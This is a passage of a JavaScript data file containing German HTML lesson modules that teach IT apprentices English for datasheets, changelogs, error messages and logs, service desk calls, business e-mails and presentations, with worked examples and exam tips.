          <li><strong>US-Datum</strong> MM/DD/YYYY: 10/02/2026 = 2. Oktober 2026. <strong>UK-Datum</strong> DD/MM/YYYY: 10/02/2026 = 10. Februar 2026. Eindeutig ist nur ISO 8601: <strong>2026-10-02</strong>.</li>
          <li><strong>Uhrzeit:</strong> 3 p.m. = 15:00 Uhr; 12 p.m. = 12:00 Uhr mittags (noon); 12 a.m. = 0:00 Uhr (midnight).</li>
        </ul>
        <div class="callout formel"><strong>Umrechnungen</strong><br>°C = (°F − 32) × 5/9 · 1 inch (″) = 2,54 cm · 1 lb (pound) ≈ 0,4536 kg · 1 byte = 8 bit</div>
        <div class="callout beispiel"><strong>Beispiel: US-Datenblatt umrechnen</strong><br>„Operating temperature: 32 °F to 104 °F; weight: 5 lbs; 24″ display; Wi-Fi throughput up to 1 Gbps“<br>32 °F → (32 − 32) × 5/9 = <strong>0 °C</strong>; 104 °F → (104 − 32) × 5/9 = 72 × 5/9 = <strong>40 °C</strong><br>5 lbs × 0,4536 kg ≈ <strong>2,27 kg</strong>; 24 × 2,54 cm = <strong>60,96 cm</strong> Bilddiagonale<br>1 Gbps = 1.000 Mbit/s ÷ 8 = <strong>höchstens 125 MB/s</strong> (Datenrate dezimal; „up to“ = theoretischer Höchstwert)</div>
        <div class="callout achtung"><strong>Prüfungsfalle:</strong> <em>Gb</em> (Gigabit) ≠ <em>GB</em> (Gigabyte) – Faktor 8. Und 10/02 ist in den USA Oktober, in Großbritannien Februar. Im Zweifel: Herkunft des Dokuments prüfen (USD, Ort, Telefonnummer).</div>
        <div class="callout tipp"><strong>Tipp:</strong> <em>e.g.</em> = lateinisch „exempli gratia“ (zum Beispiel; Eselsbrücke: „<strong>e</strong>xample <strong>g</strong>iven“), <em>i.e.</em> = „id est“ (das heißt). Nach <em>e.g.</em> folgt eine Auswahl, nach <em>i.e.</em> eine genaue Erklärung.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> „Rechnen Sie den im Datenblatt angegebenen Temperaturbereich in °C um.“ · „Erklären Sie die Abkürzungen EOL und RMA aus der Hersteller-Mail.“ · Datenraten aus englischen Datenblättern (Mbps, Gbps) werden in Übertragungszeiten verrechnet.</div>
      `
    },
    {
      id: "datenblatt-manual",
      title: "Reading: Datenblätter, Manuals & Changelogs",
      exam: ["AP1", "AP2"],
      summary: "Wie Datenblätter, Handbücher, Sicherheitshinweise und Changelogs aufgebaut sind, wie du die entscheidenden Werte findest und wie du daraus Entscheidungen ableitest.",
      html: `
        <p>Technische Dokumente folgen festen Mustern. Wer den Aufbau kennt, findet die gesuchte Information in Sekunden – das ist die wichtigste Lesestrategie für englische Belegsätze.</p>
        <h5>Aufbau typischer Dokumente</h5>
        <table><thead><tr><th>Dokument</th><th>Typische Abschnitte</th><th>Wofür du es brauchst</th></tr></thead><tbody>
          <tr><td>Datasheet</td><td>Overview/Key features · Specifications · Power · Environmental · Certifications · Ordering information · Warranty</td><td>Kennwerte vergleichen (NWA), rechnen, Eignung prüfen</td></tr>
          <tr><td>User manual / installation guide</td><td>Safety instructions · Package contents · Installation · Configuration · Troubleshooting · Specifications</td><td>Einrichtung, Fehlersuche, Einweisung</td></tr>
          <tr><td>Quick start guide</td><td>nummerierte Schritte mit Bildern</td><td>schnelle Inbetriebnahme</td></tr>
          <tr><td>Release notes / changelog</td><td>New features · Fixed issues · Known issues · Security · Deprecated</td><td>entscheiden, ob und wann ein Update nötig ist</td></tr>
        </tbody></table>
        <h5>Signalwörter in Sicherheitshinweisen</h5>
        <table><thead><tr><th>Signalwort</th><th>Bedeutung</th></tr></thead><tbody>
          <tr><td>DANGER</td><td>führt zu Tod oder schwerer Verletzung, wenn nicht beachtet</td></tr>
          <tr><td>WARNING</td><td>kann zu Tod oder schwerer Verletzung führen</td></tr>
          <tr><td>CAUTION</td><td>kann zu leichter oder mittlerer Verletzung führen</td></tr>
          <tr><td>NOTICE</td><td>Sachschaden möglich (z. B. Datenverlust, Geräteschaden)</td></tr>
          <tr><td>NOTE / TIP</td><td>Hinweis, Tipp – keine Gefahr</td></tr>
        </tbody></table>
        <h5>Changelogs und Versionsnummern</h5>
        <p>Viele Projekte gliedern Changelogs in <strong>Added</strong> (neu), <strong>Changed</strong> (geändert), <strong>Deprecated</strong> (abgekündigt), <strong>Removed</strong> (entfernt), <strong>Fixed</strong> (Fehler behoben) und <strong>Security</strong> (Sicherheitslücke geschlossen). Versionsnummern folgen oft dem <strong>Semantic Versioning</strong>: MAJOR.MINOR.PATCH – z. B. 3.4.2.</p>
        <ul>
          <li><strong>PATCH</strong> (3.4.1 → 3.4.2): nur Fehlerkorrekturen, kompatibel.</li>
          <li><strong>MINOR</strong> (3.4.2 → 3.5.0): neue Funktionen, abwärtskompatibel.</li>
          <li><strong>MAJOR</strong> (3.5.0 → 4.0.0): <em>breaking changes</em> – inkompatible Änderungen, vorher testen!</li>
        </ul>
        <pre><code>## [2.8.1] - 2026-09-15
### Security
- Fixed a vulnerability in the web interface (login bypass).
### Fixed
- VPN tunnel no longer drops after 24 hours.
### Deprecated
- TLS 1.1 support will be removed in version 3.0.0.</code></pre>
        <p>→ Das Update schließt eine Sicherheitslücke, durch die man die Anmeldung umgehen konnte. Es soll <strong>zeitnah</strong> eingespielt werden. Außerdem wird ein VPN-Fehler behoben. Hinweis für später: TLS 1.1 fällt mit Version 3.0.0 weg – TLS 1.0 und 1.1 gelten ohnehin seit 2021 offiziell als veraltet (RFC 8996), Clients sollten also schon jetzt TLS 1.2 oder 1.3 nutzen.</p>
        <div class="callout beispiel"><strong>Beispiel: Kamera-Datenblatt auswerten</strong><br>„PoE (IEEE 802.3af), max. power consumption 9.5 W · IR range up to 30 m · built-in heater · operating temperature −30 °C to +60 °C · IP67“<br><strong>Bedeutung:</strong> Stromversorgung über das Netzwerkkabel; Infrarot-Nachtsicht bis zu 30 m; eingebaute Heizung für den Betrieb bei Frost; staubdicht und geschützt gegen zeitweiliges Untertauchen.<br><strong>Strom bei 48 V:</strong> I = P ÷ U = 9,5 W ÷ 48 V ≈ 0,198 A ≈ <strong>198 mA</strong>.<br><strong>PoE-Budget:</strong> Ein Switch mit 65 W PoE-Budget reserviert bei klassenbasierter Vergabe (so rechnen Prüfungsaufgaben) je 802.3af-Port 15,4 W. Für 4 Kameras: 4 × 15,4 W = 61,6 W ≤ 65 W → reicht. Für 5 Kameras: 77 W &gt; 65 W → reicht nicht sicher, obwohl die tatsächliche Aufnahme nur 5 × 9,5 W = 47,5 W beträgt.</div>
        <div class="callout formel"><strong>Formeln</strong><br>I = P ÷ U · 802.3af (PoE): 15,4 W am Switch-Port, 12,95 W am Endgerät · 802.3at (PoE+): 30 W / 25,5 W · 802.3bt (PoE++): Type 3 60 W / 51 W, Type 4 90 W / 71,3 W</div>
        <div class="callout achtung"><strong>Prüfungsfalle:</strong> <em>up to</em> ist ein Höchstwert unter Idealbedingungen. <em>Typical</em> ist ein Durchschnittswert. Für die Planung (Netzteil, PoE-Budget, USV) rechnest du mit dem Maximalwert, für Stromkosten mit dem typischen Wert.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> „Prüfen Sie anhand des englischen Datenblatts, ob die Kamera am vorhandenen Switch betrieben werden kann, und berechnen Sie die Stromstärke.“ · „Entscheiden Sie anhand der Release Notes, ob das Update sofort installiert werden sollte. Begründen Sie.“</div>
      `
    },
    {
      id: "fehlermeldungen",
      title: "Error messages, Konsolenausgaben & Logs",
      exam: ["AP1", "AP2"],
      summary: "Typische englische Fehlermeldungen von ping, ipconfig, Linux-Shell, PowerShell und Browser, HTTP-Statuscodes, Syslog-Schweregrade und das Lesen von Logzeilen.",
      html: `
        <p>Fehlermeldungen sind kurz und nach festen Mustern gebaut. Achte auf die <strong>Schlüsselwörter</strong>: <em>failed</em> (fehlgeschlagen), <em>denied</em> (verweigert), <em>refused</em> (abgelehnt), <em>timed out</em> (Zeit überschritten), <em>unreachable</em> (nicht erreichbar), <em>not found</em> (nicht gefunden), <em>expired</em> (abgelaufen), <em>invalid</em> (ungültig), <em>exceeded</em> (überschritten), <em>mismatch</em> (passt nicht zusammen).</p>
        <h5>Netzwerk-Meldungen</h5>
        <table><thead><tr><th>Meldung</th><th>Bedeutung</th><th>Nächster Schritt</th></tr></thead><tbody>
          <tr><td>Request timed out.</td><td>keine Antwort innerhalb der Wartezeit</td><td>Zielgerät an? Firewall blockiert ICMP? Route prüfen (<code>tracert</code>)</td></tr>
          <tr><td>Destination host unreachable.</td><td>Ziel nicht erreichbar – im eigenen Netz oft keine ARP-Antwort, sonst fehlt eine Route</td><td>IP-Konfiguration, Gateway, Kabel prüfen</td></tr>
          <tr><td>Ping request could not find host …</td><td>Name konnte nicht aufgelöst werden</td><td>DNS prüfen: <code>nslookup</code>, <code>ipconfig /flushdns</code></td></tr>
          <tr><td>Media disconnected (ipconfig)</td><td>kein Link am Netzwerkanschluss</td><td>Kabel, Dose, Switch-Port prüfen</td></tr>
          <tr><td>Autoconfiguration IPv4 Address: 169.254.x.x (ipconfig)</td><td>APIPA-Adresse: Der Client hat keinen DHCP-Server erreicht und sich selbst eine Adresse gegeben</td><td>DHCP-Server bzw. DHCP-Relay, VLAN des Switch-Ports prüfen; <code>ipconfig /renew</code></td></tr>
          <tr><td>Windows has detected an IP address conflict.</td><td>Adresse ist doppelt vergeben</td><td>statische Adressen und DHCP-Bereich abgleichen, Reservierung anlegen</td></tr>
          <tr><td>Connection refused</td><td>Ziel erreichbar, aber am Port lauscht kein Dienst (oder er lehnt aktiv ab)</td><td>Dienst gestartet? Richtiger Port?</td></tr>
          <tr><td>No route to host</td><td>kein Weg zum Ziel bekannt oder Firewall meldet Ablehnung</td><td>Routing und Firewall prüfen</td></tr>
          <tr><td>Gi0/1 is up, line protocol is down (Cisco)</td><td>Schicht 1 ok, Schicht 2 gestört</td><td>Gegenstelle, Kapselung, Duplex prüfen</td></tr>
          <tr><td>TCP Retransmission (Wireshark)</td><td>Segment erneut gesendet</td><td>Paketverlust, Überlast, WLAN-Störung suchen</td></tr>
        </tbody></table>
        <h5>System- und Anwendungsmeldungen</h5>
        <table><thead><tr><th>Meldung</th><th>Bedeutung</th></tr></thead><tbody>
          <tr><td>Access is denied. / Permission denied</td><td>fehlende Rechte (NTFS-/Freigabe- bzw. Linux-Dateirechte)</td></tr>
          <tr><td>bash: nmapp: command not found</td><td>Befehl unbekannt – Tippfehler oder Programm nicht installiert</td></tr>
          <tr><td>The term 'Get-ADUser' is not recognized as the name of a cmdlet …</td><td>PowerShell kennt den Befehl nicht – Tippfehler oder Modul fehlt (hier: RSAT/ActiveDirectory)</td></tr>
          <tr><td>No space left on device</td><td>Datenträger voll</td></tr>
          <tr><td>The trust relationship between this workstation and the primary domain failed.</td><td>Vertrauensstellung zur Domäne gestört (Computerkonto-Kennwort passt nicht) – Rechner neu in die Domäne aufnehmen oder Kennwort zurücksetzen</td></tr>
          <tr><td>NET::ERR_CERT_DATE_INVALID</td><td>Zertifikat abgelaufen oder Systemzeit falsch</td></tr>
        </tbody></table>
        <h5>HTTP-Statuscodes</h5>
        <p><strong>2xx</strong> Erfolg (200 OK) · <strong>3xx</strong> Umleitung (301 Moved Permanently) · <strong>4xx</strong> Fehler des Clients: 401 Unauthorized (nicht angemeldet), 403 Forbidden (angemeldet, aber keine Berechtigung), 404 Not Found · <strong>5xx</strong> Fehler des Servers: 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout.</p>
        <h5>Syslog-Schweregrade (severity levels)</h5>
        <table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th></tr></thead><tbody>
          <tr><td>Emergency</td><td>Alert</td><td>Critical</td><td>Error</td><td>Warning</td><td>Notice</td><td>Informational</td><td>Debug</td></tr>
        </tbody></table>
        <p>Je <strong>kleiner</strong> die Zahl, desto <strong>schwerer</strong> der Fehler. Die Windows-Ereignisanzeige nutzt die Stufen Critical, Error, Warning, Information und Verbose.</p>
        <div class="callout tipp"><strong>Eselsbrücke Syslog 0–7:</strong> „<strong>E</strong>very <strong>A</strong>wesome <strong>C</strong>isco <strong>E</strong>ngineer <strong>W</strong>ill <strong>N</strong>eed <strong>I</strong>ce cream <strong>D</strong>aily.“</div>
        <div class="callout beispiel"><strong>Beispiel: Logzeilen lesen</strong>
<pre><code>Sep 22 14:03:17 srv01 sshd[2211]: Failed password for invalid user admin from 203.0.113.45 port 51544 ssh2
Sep 22 14:03:19 srv01 sshd[2213]: Failed password for invalid user admin from 203.0.113.45 port 51546 ssh2
Sep 22 14:03:21 srv01 sshd[2215]: Failed password for root from 203.0.113.45 port 51548 ssh2</code></pre>
        Aufbau: Zeitstempel · Host · Dienst[Prozess-ID] · Meldung. Deutung: Von derselben IP-Adresse kommen im Abstand von zwei Sekunden fehlgeschlagene SSH-Anmeldungen mit typischen Benutzernamen (<em>invalid user</em> = den Benutzer gibt es gar nicht). Das ist ein automatisierter <strong>Brute-Force-Angriff</strong>. Maßnahmen: IP sperren (z. B. fail2ban), Anmeldung nur per Schlüssel, root-Login verbieten, SSH nicht ins Internet freigeben oder nur per VPN erreichbar machen.</div>
        <div class="callout achtung"><strong>Prüfungsfalle:</strong> <em>401 Unauthorized</em> bedeutet eigentlich „nicht authentifiziert“, <em>403 Forbidden</em> „nicht autorisiert“. Und <em>Connection refused</em> heißt: Der Rechner ist erreichbar – nur der Dienst antwortet nicht. Das ist etwas anderes als <em>timed out</em>.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> „Analysieren Sie die Ausgabe des ping-Befehls und nennen Sie eine mögliche Ursache.“ (AP1) · „Erläutern Sie die Logeinträge und schlagen Sie zwei Gegenmaßnahmen vor.“ (AP2) · „Ordnen Sie die Meldungen den Syslog-Schweregraden zu.“ (AP2)</div>
      `
    },
    {
      id: "support-kommunikation",
      title: "Support-Kommunikation: Telefon, Ticket, Troubleshooting",
      exam: ["AP1"],
      summary: "Redemittel für Support-Telefonate, höfliche Formulierungen, Deeskalation, Buchstabieren mit dem NATO-Alphabet und englische Tickets nach festem Schema.",
      html: `
        <p>Im Service Desk sprichst du mit Anwendern, Herstellern und Kolleginnen und Kollegen aus anderen Ländern. Der Rahmenlehrplan (LF 6) verlangt ausdrücklich, auch <strong>auf Englisch situationsgerecht zu kommunizieren</strong>. Ein Support-Gespräch folgt immer demselben Ablauf.</p>
        <h5>Ablauf eines Support-Telefonats</h5>
        <table><thead><tr><th>Phase</th><th>Redemittel</th></tr></thead><tbody>
          <tr><td>1. Begrüßen</td><td>Good morning, Nordlicht IT service desk, Lena speaking. How can I help you?</td></tr>
          <tr><td>2. Identifizieren</td><td>Could I have your name and customer number, please? · Could you spell that, please?</td></tr>
          <tr><td>3. Problem erfragen</td><td>What exactly happens when you …? · When did the problem start? · Has anything changed recently? · Is anyone else affected? · Do you get an error message? Could you read it out to me?</td></tr>
          <tr><td>4. Lösen / anleiten</td><td>Let's try the following. · Could you please restart …? · Please click on … · What do you see now?</td></tr>
          <tr><td>5. Weitergeben / eskalieren</td><td>Would you mind holding for a moment? · I'll put you through to our network team. · I'll escalate this to our second-level support.</td></tr>
          <tr><td>6. Zusagen und abschließen</td><td>I've opened ticket number 4711 for you. · We'll get back to you within two hours. · Is there anything else I can do for you? · Thank you for calling.</td></tr>
        </tbody></table>
        <h5>Höflich formulieren</h5>
        <ul>
          <li><strong>Bitten statt befehlen:</strong> „Restart the PC!“ → „<em>Could you</em> restart the PC, please?“ / „<em>Would you mind</em> restarting the PC?“ (nach <em>would you mind</em> folgt -ing).</li>
          <li><strong>Schlechte Nachrichten abfedern:</strong> „<em>I'm afraid</em> the part won't arrive before Friday.“ / „<em>Unfortunately</em> …“</li>
          <li><strong>Keine Schuldzuweisung:</strong> „You deleted the file.“ → „It looks like the file was deleted.“ (Passiv)</li>
          <li><strong>Deeskalieren:</strong> „I understand how frustrating this must be.“ · „I'm sorry for the inconvenience.“ · „Let me see what I can do for you.“</li>
          <li><strong>Verständnis sichern:</strong> „So, if I understand you correctly, …“ · „Just to confirm: …“</li>
        </ul>
        <h5>Buchstabieren und Sonderzeichen</h5>
        <p>NATO-Alphabet: Alfa, Bravo, Charlie, Delta, Echo, Foxtrot, Golf, Hotel, India, Juliett, Kilo, Lima, Mike, November, Oscar, Papa, Quebec, Romeo, Sierra, Tango, Uniform, Victor, Whiskey, X-ray, Yankee, Zulu.</p>
        <p><strong>@</strong> at · <strong>.</strong> dot · <strong>-</strong> hyphen/dash · <strong>_</strong> underscore · <strong>/</strong> (forward) slash · <strong>\\</strong> backslash · <strong>:</strong> colon · <strong>#</strong> hash · <strong>A</strong> capital A · <strong>a</strong> lower case a. IP-Adressen werden Ziffer für Ziffer gesprochen: 192.168.0.1 = „one nine two dot one six eight dot zero dot one“.</p>
        <h5>Service-Desk-Vokabular (nach ITIL 4)</h5>
        <table><thead><tr><th>Englisch</th><th>Bedeutung</th><th>Beispiel</th></tr></thead><tbody>
          <tr><td>incident</td><td>ungeplante Unterbrechung oder Qualitätsminderung eines Dienstes (Störung)</td><td>„The VPN is down.“</td></tr>
          <tr><td>service request</td><td>Anfrage nach einer vereinbarten Standardleistung – nichts ist kaputt</td><td>„Please install Visio for me.“ / Passwort-Reset</td></tr>
          <tr><td>problem, root cause, known error</td><td>(unbekannte) Ursache einer oder mehrerer Störungen, Grundursache, analysiertes Problem mit dokumentiertem Workaround</td><td>Scanner verlieren nach jedem Firmware-Update das Netz</td></tr>
          <tr><td>change</td><td>geplante Änderung an Systemen oder Diensten</td><td>Firmware-Update im Wartungsfenster</td></tr>
          <tr><td>first / second / third level support</td><td>1st Level (Service Desk, Standardfälle), 2nd Level (Fachteams), 3rd Level (Spezialisten, Hersteller)</td><td>„I'll escalate this to second level.“</td></tr>
          <tr><td>functional / hierarchical escalation</td><td>Weitergabe an höhere Fachebene / an Vorgesetzte bzw. Management</td><td>Techniker → Netzwerkteam / Teamleitung informieren</td></tr>
          <tr><td>self-service portal, knowledge base</td><td>Portal, in dem Anwender selbst Tickets anlegen und Lösungen finden; Wissensdatenbank mit Lösungsartikeln</td><td>„Please check article KB-0815.“</td></tr>
          <tr><td>first call resolution (FCR)</td><td>Anteil der Anfragen, die beim ersten Kontakt gelöst werden</td><td>180 von 240 Anrufen → 75 %</td></tr>
          <tr><td>MTTR (mean time to repair/restore)</td><td>durchschnittliche Zeit bis zur Wiederherstellung nach einer Störung</td><td>Summe der Ausfallzeiten ÷ Anzahl Störungen</td></tr>
          <tr><td>response time / resolution time</td><td>Reaktionszeit (bis zur ersten Bearbeitung) / Lösungszeit (bis zur Lösung) – beides im SLA festgelegt</td><td>„response within 30 minutes“</td></tr>
        </tbody></table>
        <p><strong>Ticketstatus:</strong> <em>new</em> (neu) → <em>assigned</em> (zugewiesen) → <em>in progress</em> (in Bearbeitung) → ggf. <em>on hold / pending</em> (wartet auf Anwender, Hersteller oder Lieferung) → <em>resolved</em> (gelöst, Bestätigung steht aus) → <em>closed</em> (abgeschlossen); <em>reopened</em> = wieder geöffnet.</p>
        <h5>Ein Ticket auf Englisch schreiben</h5>
        <div class="callout beispiel"><strong>Beispiel-Ticket</strong><br><strong>Summary:</strong> Printer on 2nd floor (HP-2F-01) prints blank pages<br><strong>Description:</strong> Since this morning, all print jobs from the sales team come out blank. The printer display shows no error.<br><strong>Steps to reproduce:</strong> 1. Print any document to HP-2F-01. 2. Collect the printout.<br><strong>Expected result:</strong> The document is printed correctly. <strong>Actual result:</strong> Blank pages.<br><strong>Impact / urgency:</strong> 8 users affected; the workaround is printer HP-2F-02 → priority: medium.<br><strong>Status:</strong> In progress – toner cartridge ordered.</div>
        <div class="callout merke"><strong>Merke:</strong> Ein gutes Ticket beantwortet <em>what, where, since when, who is affected, what has been tried</em>. Die <strong>priority</strong> ergibt sich aus <strong>impact</strong> (Auswirkung) und <strong>urgency</strong> (Dringlichkeit).</div>
        <div class="callout achtung"><strong>Typische Fehler:</strong> „I will call you back“ zusagen und keine Frist nennen; „You must …“ statt „Could you …“; Ticketstatus <em>resolved</em> (gelöst, Kunde muss noch bestätigen) mit <em>closed</em> (abgeschlossen) verwechseln.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> In der AP1 sind Support-Level, Ticketsysteme und Kundenkommunikation Pflicht (Katalog 01.03 und 02.03). Englische Tickets oder E-Mails musst du dort verstehen und auf Deutsch auswerten. Aktive Telefonate auf Englisch kommen in der Berufsschule (Rollenspiel, Klassenarbeit) dran.</div>
      `
    },
    {
      id: "business-emails",
      title: "Business E-Mails schreiben",
      exam: ["AP1"],
      summary: "Aufbau einer geschäftlichen E-Mail, Anrede und Grußformeln (britisch/amerikanisch), Redemittel für Anfrage, Angebot, Beschwerde und Statusmeldung sowie Netiquette.",
      html: `
        <p>Eine geschäftliche E-Mail ist <strong>kurz, klar und höflich</strong>. Der Empfänger soll in wenigen Sekunden erkennen: Worum geht es, was soll ich tun, bis wann?</p>
        <h5>Aufbau</h5>
        <table><thead><tr><th>Teil</th><th>Beispiel</th><th>Hinweis</th></tr></thead><tbody>
          <tr><td>Subject line</td><td>Request for quotation: 12 notebooks for our Husum office</td><td>konkret, kein „Hello“ oder „Question“</td></tr>
          <tr><td>Salutation</td><td>Dear Ms Jensen, / Dear Sir or Madam, / Hi Tom,</td><td><em>Ms</em> für Frauen (neutral); informell nur bei bekannten Personen</td></tr>
          <tr><td>Opening</td><td>Thank you for your email of 21 September. / I am writing to …</td><td>Bezug und Anlass nennen</td></tr>
          <tr><td>Body</td><td>ein Thema pro Absatz</td><td>Fakten: was, wie viele, bis wann</td></tr>
          <tr><td>Call to action</td><td>Could you please send us your offer by Friday, 2 October?</td><td>klare Bitte mit Frist</td></tr>
          <tr><td>Closing sentence</td><td>I look forward to hearing from you. / Please do not hesitate to contact me if you have any questions.</td><td></td></tr>
          <tr><td>Sign-off</td><td>Kind regards, / Best regards,</td><td>passt fast immer</td></tr>
          <tr><td>Signature</td><td>Name, position, company, phone</td><td></td></tr>
        </tbody></table>
        <h5>Anrede und Grußformel</h5>
        <ul>
          <li>Britisch formell: <em>Dear Sir or Madam</em> → <strong>Yours faithfully</strong> (Name unbekannt); <em>Dear Mr Hansen</em> → <strong>Yours sincerely</strong> (Name bekannt).</li>
          <li>Amerikanisch: <em>Dear Mr. Hansen:</em> oder mit Komma, Schluss mit <strong>Sincerely</strong>; im Alltag <em>Best regards</em>.</li>
          <li>Nach der Anrede mit Komma beginnt die nächste Zeile im Englischen mit einem <strong>Großbuchstaben</strong> – anders als im Deutschen.</li>
        </ul>
        <h5>Redemittel nach Anlass</h5>
        <table><thead><tr><th>Anlass</th><th>Redemittel</th></tr></thead><tbody>
          <tr><td>Anfrage (enquiry)</td><td>We are interested in … · Could you please send us a quotation for …?</td></tr>
          <tr><td>Angebot (offer/quotation)</td><td>Thank you for your enquiry. We are pleased to offer … · The offer is valid until …</td></tr>
          <tr><td>Anhang</td><td>Please find attached … / I have attached …</td></tr>
          <tr><td>Beschwerde (complaint)</td><td>I am writing to complain about … · Unfortunately, the delivery was incomplete.</td></tr>
          <tr><td>Antwort auf Beschwerde</td><td>We apologise for the inconvenience. · We have already … · As a gesture of goodwill, …</td></tr>
          <tr><td>Statusmeldung</td><td>I would like to update you on … · The migration has been completed. · The next step is …</td></tr>
          <tr><td>Termin</td><td>Would Tuesday at 10 a.m. suit you? · I am afraid I am not available on …</td></tr>
          <tr><td>Erinnerung</td><td>I would like to remind you that … · We have not yet received …</td></tr>
        </tbody></table>
        <h5>Formell statt umgangssprachlich</h5>
        <p><em>I want</em> → I would like · <em>get</em> → receive · <em>ASAP</em> → as soon as possible / at your earliest convenience · <em>I'm, don't</em> → I am, do not · <em>Sorry!</em> → We apologise for …</p>
        <div class="callout beispiel"><strong>Beispiel: Antwort auf eine Beschwerde</strong><br>Subject: Your complaint about order 2026-318<br><br>Dear Mr Nielsen,<br><br>Thank you for your email of 22 September. We are very sorry that two of the twelve notebooks were delivered without power supplies.<br><br>We have already sent the missing power supplies by express. They will arrive on Thursday, 24 September. As a gesture of goodwill, we will not charge the shipping costs.<br><br>Please do not hesitate to contact me if you have any further questions.<br><br>Kind regards,<br>Jonas Petersen<br>Service Desk, Nordlicht IT GmbH, Heide</div>
        <div class="callout achtung"><strong>Netiquette-Fallen:</strong> Externe Empfänger einer Rundmail gehören ins <strong>BCC</strong>, sonst werden E-Mail-Adressen offengelegt (DSGVO). Kein Text in GROSSBUCHSTABEN (gilt als Schreien). <em>Reply all</em> nur, wenn alle die Antwort brauchen. Keine Passwörter oder sensiblen Daten unverschlüsselt senden.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> AP1: „Formulieren Sie eine kurze, sachliche E-Mail an den Kunden“ (meist auf Deutsch, Aufbau wie oben) oder eine englische E-Mail auswerten. Berufsschule: vollständige englische E-Mail (Anfrage, Beschwerde, Antwort) schreiben – bewertet werden Aufbau, Register und Redemittel.</div>
      `
    },
    {
      id: "praesentieren",
      title: "Presenting in English",
      exam: ["AP1", "AP2"],
      summary: "Eine Präsentation planen, gliedern und halten: Signposting-Redemittel, gute und schlechte Präsentationen, Körpersprache, Haltung, Stimme, Foliengestaltung und Umgang mit Fragen.",
      html: `
        <p>Präsentieren ist ein Schwerpunkt im Englischunterricht (<em>Presentation Improvement</em>) und eine Kernkompetenz für die Prüfung: In der AP1 musst du eine Präsentation zielgruppengerecht aufbauen können (Katalog 02.04). In der AP2 hältst du eine <strong>Projektpräsentation</strong> mit anschließendem Fachgespräch. Struktur, Signposting und Körpersprache funktionieren auf Deutsch und Englisch gleich.</p>
        <h5>1. Planen (How to plan a presentation)</h5>
        <ul>
          <li><strong>Purpose:</strong> Informieren, überzeugen oder schulen?</li>
          <li><strong>Audience:</strong> Wer hört zu? Was wissen die Zuhörer schon? Fachleute oder Laien?</li>
          <li><strong>Key message:</strong> Eine Kernaussage in einem Satz – was sollen alle mitnehmen?</li>
          <li><strong>Structure &amp; time:</strong> Einleitung – drei Hauptpunkte – Schluss; grob 1–2 Minuten pro Folie.</li>
          <li><strong>Rehearse:</strong> laut üben, Zeit stoppen, Stichwortkarten (<em>cue cards</em>) statt ausformuliertem Text.</li>
        </ul>
        <h5>2. Signposting – Wegweiser für die Zuhörer</h5>
        <table><thead><tr><th>Funktion</th><th>Redemittel</th></tr></thead><tbody>
          <tr><td>Begrüßen, Thema</td><td>Good morning, everyone. Today I'm going to talk about … · The purpose of this presentation is to …</td></tr>
          <tr><td>Agenda</td><td>I've divided my talk into three parts. First, … Then, … Finally, …</td></tr>
          <tr><td>Fragen-Regel</td><td>Please feel free to interrupt me. / I'll be happy to answer your questions at the end.</td></tr>
          <tr><td>Überleitung</td><td>Let's move on to … · This brings me to my next point. · Now let's turn to …</td></tr>
          <tr><td>Auf Folien verweisen</td><td>As you can see on this slide, … · Let's have a look at this chart.</td></tr>
          <tr><td>Beispiel, Betonung</td><td>For example, … · Let me give you an example. · What's really important here is …</td></tr>
          <tr><td>Zusammenfassen</td><td>To sum up, … · Let me summarise the main points. · In conclusion, …</td></tr>
          <tr><td>Abschluss, Fragen</td><td>Thank you for your attention. Are there any questions?</td></tr>
          <tr><td>Auf Fragen reagieren</td><td>That's a good question. · I'm afraid I don't know that right now, but I'll find out and get back to you.</td></tr>
        </tbody></table>
        <h5>3. Good vs. bad presentation</h5>
        <table><thead><tr><th>Bad</th><th>Good</th></tr></thead><tbody>
          <tr><td>liest Folien oder Zettel ab</td><td>spricht frei mit Stichwortkarten</td></tr>
          <tr><td>Textwüste auf Folien</td><td>eine Idee pro Folie, Stichworte, Bilder, große Schrift</td></tr>
          <tr><td>kein roter Faden</td><td>Agenda und hörbare Überleitungen</td></tr>
          <tr><td>monotone Stimme, zu schnell</td><td>Tempo variieren, Pausen, Betonung</td></tr>
          <tr><td>Rücken zum Publikum, kein Blickkontakt</td><td>Blickkontakt mit dem ganzen Raum</td></tr>
          <tr><td>Zeit überzogen</td><td>Zeit eingehalten, klare Kernaussage am Ende</td></tr>
        </tbody></table>
        <h5>4. Body language, posture and voice</h5>
        <ul>
          <li><strong>Posture:</strong> aufrecht stehen, Gewicht auf beiden Füßen, nicht wippen oder an das Pult lehnen.</li>
          <li><strong>Gestures:</strong> offene Gesten, Hände sichtbar – nicht in den Hosentaschen, keine verschränkten Arme, nicht mit Stift oder Clicker spielen.</li>
          <li><strong>Eye contact:</strong> den ganzen Raum ansehen, je Person ein paar Sekunden; nicht auf die Leinwand starren.</li>
          <li><strong>Movement:</strong> gezielt bewegen, nicht im Bild der Präsentation stehen.</li>
          <li><strong>Voice:</strong> laut genug, langsamer als im Alltag, Pausen nach wichtigen Aussagen.</li>
        </ul>
        <div class="callout tipp"><strong>Tipp aus dem Unterricht:</strong> Übe die Struktur an einem fachfremden Thema – zum Beispiel einer Anleitung zum Burgerbauen: Agenda, Abschnitte, ein Schnittbild-Diagramm, eine Tabelle „problem – likely cause – fix“. Wenn das klar wirkt, klappt es auch mit „How to set up a VLAN“.</div>
        <div class="callout merke"><strong>Merke:</strong> Tell them what you're going to tell them (Agenda) – tell them (Hauptteil) – tell them what you've told them (Zusammenfassung).</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> AP1: „Nennen Sie vier Regeln für die Gestaltung von Präsentationsfolien“ oder „Beschreiben Sie den Aufbau einer Präsentation für die Anwenderschulung“. AP2: Projektpräsentation (höchstens 15 min, zusammen mit dem Fachgespräch höchstens 30 min) – bewertet werden u. a. Aufbau, Medieneinsatz, Sprache und Auftreten. Berufsschule: englische Präsentation mit Signposting.</div>
      `
    },
    {
      id: "prozesse-grafiken",
